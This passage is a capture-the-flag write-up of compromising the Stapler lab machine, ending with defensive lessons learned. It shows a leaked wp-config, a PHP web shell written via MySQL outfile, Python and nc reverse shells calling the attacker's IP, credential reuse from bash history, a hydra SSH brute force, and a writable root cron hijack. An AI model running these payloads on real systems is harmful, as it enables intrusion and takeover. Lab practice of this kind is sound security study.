 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'plbkac');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'V 5p=[.Vds8~SX;>t)++Tt57U6{Xe`T|oW^eQ!mHr }]>9RX07W<sZ,I~`6Y5-T:');
define('SECURE_AUTH_KEY',  'vJZq=p.Ug,]:<-P#A|k-+:;JzV8*pZ|K/U*J][Nyvs+}&!/#>4#K7eFP5-av`n)2');
define('LOGGED_IN_KEY',    'ql-Vfg[?v6{ZR*+O)|Hf OpPWYfKX0Jmpl8zU<cr.wm?|jqZH:YMv;zu@tM7P:4o');
define('NONCE_KEY',        'j|V8J.~n}R2,mlU%?C8o2[~6Vo1{Gt+4mykbYH;HDAIj9TE?QQI!VW]]D`3i73xO');
define('AUTH_SALT',        'I{gDlDs`Z@.+/AdyzYw4%+<WsO-LDBHT}>}!||Xrf@1E6jJNV={p1?yMKYec*OI$');
define('SECURE_AUTH_SALT', '.HJmx^zb];5P}hM-uJ%^+9=0SBQEh[[*>#z+p>nVi10`XOUq (Zml~op3SG4OG_D');
define('LOGGED_IN_SALT',   '[Zz!)%R7/w37+:9L#.=hL:cyeMM2kTx&_nP4{D}n=y=FQt%zJw>c[a+;ppCzIkt;');
define('NONCE_SALT',       'tb(}BfgB7l!rhDVm{eK6^MSN-|o]S]]axl4TE_y+Fi5I-RxN/9xeTsK]#ga_9:hJ');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each a unique
 * prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
        define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');

define('WP_HTTP_BLOCK_EXTERNAL', true);
```

After researching what I could do with root access to MySQL, I learned about the following way to be able to execute shell commands directly on the target's machine:

 ```bash
kali@kali:~$ mysql -u root -p -h 192.168.56.114
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 1882
Server version: 5.7.12-0ubuntu1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [mysql]> SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/blogblog/wp-content/uploads/inject.php";
ERROR 1 (HY000): Can't create/write to file '/var/www/html/blogblog/wp-content/uploads/inject.php' (Errcode: 2 - No such file or directory)
MySQL [mysql]> SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/inject.php";
ERROR 1 (HY000): Can't create/write to file '/var/inject.php' (Errcode: 13 - Permission denied)
MySQL [mysql]> SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/inject.php";
ERROR 1 (HY000): Can't create/write to file '/var/www/inject.php' (Errcode: 13 - Permission denied)
MySQL [mysql]> SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/inject.php";
ERROR 1 (HY000): Can't create/write to file '/var/www/html/inject.php' (Errcode: 2 - No such file or directory)
MySQL [mysql]> SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/https/inject.php";
ERROR 1 (HY000): Can't create/write to file '/var/www/https/inject.php' (Errcode: 13 - Permission denied)
MySQL [mysql]> SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/https/blogblog/wp-content/uploads/inject.php";                                       
Query OK, 1 row affected (0.001 sec)
kali@kali:~$ curl -k https://192.168.56.114:12380/blogblog/wp-content/uploads/inject.php?cmd=ls
1930028253.jpeg
inject.php
shell.php
kali@kali:~$ curl -k https://192.168.56.114:12380/blogblog/wp-content/uploads/inject.php?cmd=whoami
www-data
```

However, catching the shell on my own machine the usual way did not work:

```bash
kali@kali:~$ nc -nlvp 7777
listening on [any] 7777 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.102] 37110
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
HTTP/1.1 200 OK
Date: Sun, 03 May 2020 13:00:26 GMT
Server: Apache/2.4.18 (Ubuntu)
Dave: Soemthing doesn't look right here
Content-Length: 0
Content-Type: text/html; charset=UTF-8

kali@kali:~$
```

I tried again through various other ways of which the following Python alternative worked:

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

```bash
kali@kali:~$ nc -nlvp 7777
listening on [any] 7777 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.114] 32930
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

I have to mention that using `curl` to catch the reverse shell did not work, this had to be done by manually visiting the entire url in my browser: `https://192.168.56.114:12380/blogblog/wp-content/uploads/inject.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`.

I started enumerating the machine for things that stood out. One of the things I noticed was the Python HTTP server running from the `/home/JKanode` directory, so I gave that directory a look.

```bash
$ ps aux | grep root | grep -v ]
ps aux | grep root | grep -v ]
root         1  0.0  0.4   6728  4616 ?        Ss   10:29   0:03 /sbin/init
root       379  0.0  0.2   5748  2684 ?        Ss   10:29   0:00 /lib/systemd/systemd-journald
root       396  0.0  0.1  13284  1368 ?        Ss   10:29   0:00 /sbin/lvmetad -f
root       420  0.0  0.3  13840  3188 ?        Ss   10:29   0:00 /lib/systemd/systemd-udevd
root       533  0.0  0.2   4076  2776 ?        Ss   10:29   0:00 /lib/systemd/systemd-logind
root       544  0.0  0.2   5576  2600 ?        Ss   10:29   0:00 /usr/sbin/cron -f
root       545  0.0  0.2 113904  3004 ?        Ssl  10:29   0:04 /usr/bin/lxcfs /var/lib/lxcfs/
root       563  0.0  0.1   2244  1176 ?        Ss   10:29   0:00 /usr/sbin/acpid
root       706  0.0  0.0   3132   108 ?        Ss   10:29   0:00 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog
root       845  0.0  0.5  10104  5148 ?        Ss   10:29   0:00 /usr/sbin/sshd -D
root       863  0.0  0.2   5308  2928 ?        Ss   10:29   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf
root       890  0.0  0.0   2984   124 ?        Ss   10:29   0:00 /sbin/iscsid
root       891  0.0  0.2   3444  2844 ?        S<Ls 10:29   0:03 /sbin/iscsid
root       995  0.0  0.1   2540  1652 ?        S    10:29   0:00 /usr/sbin/inetutils-inetd
root      1070  0.0  2.0 127044 21464 ?        Ss   10:29   0:01 php-fpm: master process (/etc/php/7.0/fpm/php-fpm.conf)
root      1119  0.0  0.5  26228  5200 ?        Ss   10:29   0:00 /usr/sbin/nmbd -D
root      1120  0.0  1.2  42308 12340 ?        Ss   10:29   0:00 /usr/sbin/smbd -D
root      1123  0.0  0.2   6008  2600 ?        Ss   10:29   0:00 dhclient enp0s3
root      1125  0.0  0.4  40464  4656 ?        S    10:29   0:00 /usr/sbin/smbd -D
root      1128  0.0  2.0 127368 21208 ?        Ss   10:29   0:00 /usr/sbin/apache2 -k start
root      1131  0.0  0.5  42308  5856 ?        S    10:29   0:00 /usr/sbin/smbd -D
root      1276  0.0  0.2  34088  2828 ?        Ss   10:29   0:00 /usr/lib/postfix/sbin/master
root      1285  0.0  0.2   5720  2784 ?        S    10:29   0:00 /bin/bash /root/python.sh
root      1287  0.0  0.2   5724  2956 ?        S    10:29   0:00 /bin/bash /usr/local/src/nc.sh
root      1289  0.0  0.3   6472  3076 ?        S    10:29   0:00 su -c authbind php -S 0.0.0.0:80 -t /home/www/ &>/dev/null www
root      1299  0.0  0.3   6472  3200 ?        S    10:29   0:00 su -c cd /home/JKanode; python2 -m SimpleHTTPServer 8888 &>/dev/null JKanode
root      1300  0.0  0.1   4748  1468 tty1     Ss+  10:29   0:00 /sbin/agetty --noclear tty1 linux
root      3617  0.0  0.0   2692   660 ?        S    12:19   0:00 nc -nlvp 666
www-data  8465  0.0  0.0   3028   844 pts/1    S+   15:09   0:00 grep root
$ cd /home/JKanode
cd /home/JKanode
$ ls
ls
$ ls -al
ls -al
total 24
drwxr-xr-x  2 JKanode JKanode 4096 Jun  5  2016 .
drwxr-xr-x 32 root    root    4096 Jun  4  2016 ..
-rw-r--r--  1 JKanode JKanode  167 Jun  5  2016 .bash_history
-rw-r--r--  1 JKanode JKanode  220 Sep  1  2015 .bash_logout
-rw-r--r--  1 JKanode JKanode 3771 Sep  1  2015 .bashrc
-rw-r--r--  1 JKanode JKanode  675 Sep  1  2015 .profile
$ cat .bash_history
cat .bash_history
id
whoami
ls -lah
pwd
ps aux
sshpass -p thisimypassword ssh JKanode@localhost
apt-get install sshpass
sshpass -p JZQuyIN5 peter@localhost
ps -ef
top
kill -9 3747
exit
```

Both credentials did in fact work. Doing so as `JKanode` didn't gain me much, but doing so as the `peter` was a lot more interesting as this user turned out to be one of the `sudoers`:

```bash
$ ssh peter@localhost
ssh peter@localhost
Could not create directory '/var/www/.ssh'.
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:WuY26BwbaoIOawwEIZRaZGve4JZFaRo7iSvLNoCwyfA.
Are you sure you want to continue connecting (yes/no)? yes
yes
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
-----------------------------------------------------------------
~          Barry, don't forget to put a message here           ~
-----------------------------------------------------------------
peter@localhost's password: JZQuyIN5

Welcome back!


This is the Z Shell configuration function for new users,
zsh-newuser-install.
You are seeing this message because you have no zsh startup files
(the files .zshenv, .zprofile, .zshrc, .zlogin in the directory
~).  This function can help you with a few settings that should
make your use of the shell easier.

You can:

(q)  Quit and do nothing.  The function will be run again next time.

(0)  Exit, creating the file ~/.zshrc containing just a comment.
     That will prevent this function being run again.

(1)  Continue to the main menu.

(2)  Populate your ~/.zshrc with the configuration recommended
     by the system administrator and exit (you will need to edit
     the file by hand, if so desired).

--- Type one of the keys in parentheses --- q
q^J
red%                                                                           
red% whoami                                                                    
whoami
peter
red% sudo -l                                                                   
sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for peter: JZQuyIN5

Matching Defaults entries for peter on red:
    lecture=always, env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User peter may run the following commands on red:
    (ALL : ALL) ALL
red% sudo /bin/bash                                                            
sudo /bin/bash
root@red:~# whoami
whoami
root
```

Note: there were several kernel- and OS-based exploits that I could've used to gain root access. However, these usually take a lot of trial and error (due to being unstable, not working anymore for whatever reason, not fully understanding how to use them, etc.) and can disrupt the target's machine. Whenever I have to choose between two ways to escalate privileges to root I usually choose the one that doesn't involve kernel/OS exploits, as I've done here. The same goes for `metasploit` options that are  limited on the exam for the [OSCP certification](https://www.offensive-security.com/pwk-oscp/) - I try to stay away from those whenever I see alternatives.

## A second approach

When I enumerated the SMB service running on the target, I found a pretty big list of usernames:

```S-1-22-1-1000 Unix User\peter (Local User)
S-1-22-1-1001 Unix User\RNunemaker (Local User)
S-1-22-1-1002 Unix User\ETollefson (Local User)
S-1-22-1-1003 Unix User\DSwanger (Local User)
S-1-22-1-1004 Unix User\AParnell (Local User)
S-1-22-1-1005 Unix User\SHayslett (Local User)
S-1-22-1-1006 Unix User\MBassin (Local User)
S-1-22-1-1007 Unix User\JBare (Local User)
S-1-22-1-1008 Unix User\LSolum (Local User)
S-1-22-1-1009 Unix User\IChadwick (Local User)
S-1-22-1-1010 Unix User\MFrei (Local User)
S-1-22-1-1011 Unix User\SStroud (Local User)
S-1-22-1-1012 Unix User\CCeaser (Local User)
S-1-22-1-1013 Unix User\JKanode (Local User)
S-1-22-1-1014 Unix User\CJoo (Local User)
S-1-22-1-1015 Unix User\Eeth (Local User)
S-1-22-1-1016 Unix User\LSolum2 (Local User)
S-1-22-1-1017 Unix User\JLipps (Local User)
S-1-22-1-1018 Unix User\jamie (Local User)
S-1-22-1-1019 Unix User\Sam (Local User)
S-1-22-1-1020 Unix User\Drew (Local User)
S-1-22-1-1021 Unix User\jess (Local User)
S-1-22-1-1022 Unix User\SHAY (Local User)
S-1-22-1-1023 Unix User\Taylor (Local User)
S-1-22-1-1024 Unix User\mel (Local User)
S-1-22-1-1025 Unix User\kai (Local User)
S-1-22-1-1026 Unix User\zoe (Local User)
S-1-22-1-1027 Unix User\NATHAN (Local User)
S-1-22-1-1028 Unix User\www (Local User)
S-1-22-1-1029 Unix User\elly (Local User)
```

I'm not a big fan of running long, intensive bruteforce attempts (especially on the laptop I'm using), so usually I don't go further than checking for identical username and password combinations or very simple wordlist-based attempts. Since I couldn't find anything that interesting using `smbclient`, I went the SSH route instead and went for a quick bruteforce. First, I had to organize all of the usernames from earlier in a .txt file:

```bash
kali@kali:~$ awk -F'\' '{ print $2 }' stapler_users.txt | awk -F' ' '{ print $1 > "stapler_users.txt" }'
kali@kali:~$ cat stapler_users.txt
peter
RNunemaker
ETollefson
DSwanger
AParnell
SHayslett
MBassin
JBare
LSolum
IChadwick
MFrei
SStroud
CCeaser
JKanode
CJoo
Eeth
LSolum2
JLipps
jamie
Sam
Drew
jess
SHAY
Taylor
mel
kai
zoe
NATHAN
www
elly
```

```bash
kali@kali:~$ hydra -L stapler_users.txt -P stapler_users.txt -e nsr 192.168.56.114 ssh
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-03 16:47:13
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 990 login tries (l:30/p:33), ~62 tries per task
[DATA] attacking ssh://192.168.56.114:22/
[22][ssh] host: 192.168.56.114   login: SHayslett   password: SHayslett
[STATUS] 338.00 tries/min, 338 tries in 00:01h, 656 to do in 00:02h, 16 active
[STATUS] 328.00 tries/min, 656 tries in 00:02h, 339 to do in 00:02h, 16 active
[STATUS] 322.33 tries/min, 967 tries in 00:03h, 28 to do in 00:01h, 16 active
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 8 final worker threads did not complete until end.
[ERROR] 8 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-03 16:50:33
kali@kali:~$ ssh SHayslett@192.168.56.114
The authenticity of host '192.168.56.114 (192.168.56.114)' can't be established.
ECDSA key fingerprint is SHA256:WuY26BwbaoIOawwEIZRaZGve4JZFaRo7iSvLNoCwyfA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.114' (ECDSA) to the list of known hosts.
-----------------------------------------------------------------
~          Barry, don't forget to put a message here           ~
-----------------------------------------------------------------
SHayslett@192.168.56.114's password:
Welcome back!


SHayslett@red:~$ whoami
SHayslett
```

Alright, so I had working credentials to directly access the target's machine. Now my goal was to find another way to escalate these limited privileges to full privileges. Using the relatively well-known `linuxprivchecker.py`, I discovered a cron running a `.sh` script as root every 5 minutes that was world writable. Because of that, I was able to overwrite the contents of that `.sh` file with whatever I wanted, and it would execute as root within 5 minutes. For some reason I didn't get any of the `bash` and `python` versions to give me a root shell, but using the `nc` version did the trick giving me full access:

```bash
kali@kali:~$ nc -nlvp 7777
listening on [any] 7777 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.114] 33080
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
```

Note: I had numerous options in how I would use the write rights on the `.sh` file being executed every 5 minutes. For example, I could've added a new user to the admin group, or to the `sudoers` list. This time I chose for a more stealthy approach however - this way I would only have full access the second a listener is started on my Kali machine. Ideally, this is harder to detect keeping my access to the machine for a longer period of time.

## Lessons learned

There was a lot going on this target's machine, so there were probably more attack vectors than the ones I had used. Regardless, my initial access to the target's machine relied on a vulnerable Wordpress plug-in, advanced-video-embed-embed-videos-or-playlists. This (version of the) plug-in should not be used. In fact, Wordpress websites in general are very plug-in and theme dependent, so it's good practice to keep all of these up-to-date and safe as often as possible.

After that, the shell I created for myself (and the access to remote commands) relied on the fact that my MySQL user had access to `outfile`. This could've been prevented by disabling access to `outfile`.

To elevate my privileges to root level, I relied on the credentials I found in a `.bash_history` file. This could've been prevented by 1) editing the configuration so that `.bash_history` doesn't actually store any command history and/or 2) not typing plaintext passwords in your commands (and not using commands that require this). Both of these are especially true for users with `sudo` rights, as was the case here.

The second approach used the ease with which SSH usernames could be enumerated via SMB and the fact that one of these users used a password identical to their username. SSH usernames should, ideally, be kept more hidden but they should definitely never use a password identical to their username.

The way I elevated my limited access to full access after that, was based on a frequently running cron executing a world writable file as root. This could've been prevented by changing the write rights on the `.sh` file.
